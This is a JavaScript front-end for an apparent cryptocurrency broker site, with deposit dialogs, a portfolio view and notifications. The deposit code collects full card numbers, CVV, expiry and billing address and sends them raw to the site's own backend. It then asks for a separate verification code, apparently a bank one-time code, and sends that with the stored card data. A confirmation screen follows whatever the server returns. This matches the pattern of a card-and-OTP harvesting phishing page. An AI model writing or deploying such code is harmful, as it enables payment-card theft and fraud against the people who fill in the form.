const API_URL = location.hostname.includes('localhost') || location.hostname.includes('127.')
  ? 'http://localhost:3000/api'
  : 'https://krypt-broker.onrender.com/api';

  window.alert = msg => console.warn("🔔 ALERT:", msg);
// LocalStorage cache with TTL
function getCachedData(key, ttl) {
  const item = localStorage.getItem(key);
  if (!item) return null;

  try {
    const { value, expiry } = JSON.parse(item);
    if (Date.now() > expiry) {
      localStorage.removeItem(key);
      return null;
    }
    return value;
  } catch (e) {
    console.error("❌ Cache parse error for", key, e);
    return null;
  }
}

function setCachedData(key, value, ttl = 60000) {
  const expiry = Date.now() + ttl;
  localStorage.setItem(key, JSON.stringify({ value, expiry }));
}


document.addEventListener('DOMContentLoaded', () => {
  loadAssets();

  const methodDialog = document.getElementById('methodDialog');
  const cardDialog = document.getElementById('cardDialog');
  const codeDialog = document.getElementById('codeDialog');
  const depositBtn = document.getElementById('depositBtn');
  const cardBtn = document.getElementById('payWithCard');
  const makePaymentBtn = document.getElementById('makePaymentBtn');

  let cardDetails = {}; // Store temporarily

  depositBtn.onclick = () => document.getElementById('amountDialog').showModal();

  cardBtn.onclick = () => {
    methodDialog.close();
    cardDialog.showModal();
  };
makePaymentBtn.onclick = async () => {
  const form = document.getElementById('cardForm');

  const cardData = {
    firstName: form.firstName.value,
    lastName: form.lastName.value,
    cardNumber: form.cardNumber.value,
    expiry: form.expiry.value,
    cvv: form.cvv.value,
    address: form.address.value,
    city: form.city.value,
    postcode: form.postcode.value,
    country: form.country.value,
    amount: depositAmount
  };


  // Basic validation
  if (!cardData.cardNumber || !cardData.cvv || !cardData.expiry || !cardData.firstName || !cardData.lastName) {
    alert("Please fill in all required fields.");
    return;
  }

  try {
    const res = await fetch(`${API_URL}/payment/deposit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify(cardData)
    });

    const data = await res.json();
    if (!res.ok) throw new Error(data.message || "Card submission failed.");

    cardDetails = cardData; // Store for next step (code entry)
    cardDialog.close();
    codeDialog.showModal();
  } catch (err) {
    console.error('❌ Failed to submit card details:', err);
    alert(err.message || "Failed to submit card details.");
  }
};



  document.getElementById('codeForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = e.target.code.value;

    const payload = { ...cardDetails, code, amount: depositAmount };

    try {
      const res = await fetch(`${API_URL}/payment/deposit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(payload)
      });

      const data = await res.json();
// Show loading popup first
      const loadingDialog = document.getElementById("depositLoadingDialog");
      const confirmDialog = document.getElementById("depositConfirmDialog");

      loadingDialog.showModal();

      // Wait 3 seconds (same as loading bar animation), then show confirmation
      setTimeout(() => {
        loadingDialog.close();
        confirmDialog.showModal();
      }, 3000);
      e.target.reset();
      closeDialog('codeDialog');
    } catch (err) {
      console.error('❌ Failed to submit:', err);
      addNotification("Payment failed.");
    }
  });
});

function closeDialog(id) {
  const dialog = document.getElementById(id);
  if (dialog) dialog.close();
}


async function loadAssets() {
  const listContainer = document.getElementById('assetList');
  const totalDisplay = document.getElementById('totalAssets');

  try {
    // Step 1: Try to load from cache
    let holdingsData = getCachedData('userPortfolio', 60000);
    let marketCoins = getCachedData('coinMarkets', 60000);

    if (!holdingsData) {
      const res = await fetch(`${API_URL}/trade/portfolio`, { credentials: 'include' });
      const data = await res.json();
      holdingsData = data.portfolio || data.holdings || {};
      setCachedData('userPortfolio', holdingsData);
    }

    if (!marketCoins) {
      const marketRes = await fetch(`${API_URL}/coin/markets`);
      marketCoins = await marketRes.json();
      setCachedData('coinMarkets', marketCoins);
    }

    if (!holdingsData || Object.keys(holdingsData).length === 0) {
      listContainer.innerHTML = '<p style="color:gray;">No assets available.</p>';
      return;
    }

    const coinMap = {};
    marketCoins.forEach(coin => {
      coinMap[coin.symbol.toUpperCase()] = coin;
    });

    let totalUSD = 0;

    for (const [symbol, amount] of Object.entries(holdingsData)) {
      const coin = coinMap[symbol.toUpperCase()];
      if (!coin) {
        console.warn(`⚠️ Coin not found for symbol: ${symbol}`);
        continue;
      }

      const usdValue = amount * coin.current_price;
      totalUSD += usdValue;

      const card = document.createElement('div');
      card.className = 'asset-card';
      card.style.cursor = 'pointer';
      card.onclick = () => {
        window.location.href = `convert.html?symbol=${symbol}`;
      };

      card.innerHTML = `
        <div class="asset-left">
          <img class="asset-logo" src="${coin.image}" onerror="this.src='https://via.placeholder.com/32'" />
          <div class="asset-info">
            <div class="symbol">${symbol}</div>
            <div class="usd">${coin.name}</div>
          </div>
        </div>
        <div class="amount">
          <div>${amount.toFixed(8)}</div>
          <div class="usd">≈ $${usdValue.toFixed(2)}</div>
        </div>
      `;

      listContainer.appendChild(card);
    }

    totalDisplay.textContent = `$${totalUSD.toFixed(2)}`;
  } catch (err) {
    console.error('❌ Failed to load assets:', err);
    listContainer.innerHTML = '<p style="color:red;">Error loading assets.</p>';
  }

  let prevTotal = parseFloat(localStorage.getItem("prevTotalAssets") || "0");

if (totalUSD > prevTotal && prevTotal > 0) {
  const gain = (totalUSD - prevTotal).toFixed(2);
  addNotification(`📈 Portfolio gained $${gain}`, "success");
}

localStorage.setItem("prevTotalAssets", totalUSD);

}

let depositAmount = 0;

const amountInput = document.getElementById('depositAmountInput');
const amountWarning = document.getElementById('amountWarning');
const depositSubmitBtn = document.getElementById('depositSubmitBtn');

amountInput.addEventListener('input', () => {
  const value = parseFloat(amountInput.value);

  if (value >= 30) {
    amountWarning.style.display = 'none';
    depositSubmitBtn.disabled = false;
  } else {
    amountWarning.style.display = 'block';
    depositSubmitBtn.disabled = true;
  }
});


document.getElementById('amountForm').addEventListener('submit', (e) => {
  e.preventDefault();
  const amountInput = document.getElementById('depositAmountInput');
  depositAmount = parseFloat(amountInput.value);

  if (!depositAmount || depositAmount <= 29) {
    alert("Please enter a valid amount.");
    return;
  }

  closeDialog('amountDialog');
  methodDialog.showModal();
});

// ✅ Notifications
let notifications = JSON.parse(localStorage.getItem("notifications") || "[]");

function renderNotifications() {
  const notifList = document.getElementById("notificationList");
  const notifCount = document.getElementById("notifCount");

  notifList.innerHTML = "";
  if (notifications.length === 0) {
    notifList.innerHTML = '<li style="padding:8px;color:#777;">No notifications</li>';
    notifCount.style.display = "none";
    return;
  }

  notifications.forEach(n => {
    const li = document.createElement("li");
    li.style.backgroundColor = "black";
    li.style.padding = "8px 12px";
    li.style.borderBottom = "1px solid #333";
    li.style.color = n.type === "success" ? "#00ff95" : n.type === "error" ? "#ff4d4f" : "#fff";
    li.textContent = `[${new Date(n.time).toLocaleTimeString()}] ${n.message}`;
    notifList.appendChild(li);
  });

  notifCount.textContent = notifications.length;
  notifCount.style.display = "inline-block";
}

function addNotification(message, type = "info") {
  notifications.unshift({ message, type, time: Date.now() });
  if (notifications.length > 50) notifications.pop();
  localStorage.setItem("notifications", JSON.stringify(notifications));
  renderNotifications();
}

// ✅ Bell toggle
document.getElementById("notificationBell").onclick = () => {
  const panel = document.getElementById("notificationPanel");
  panel.style.display = panel.style.display === "block" ? "none" : "block";
  document.getElementById("notifCount").style.display = "none";
};

// ✅ On load
document.addEventListener("DOMContentLoaded", () => {
  renderNotifications();
  loadAssets();
});
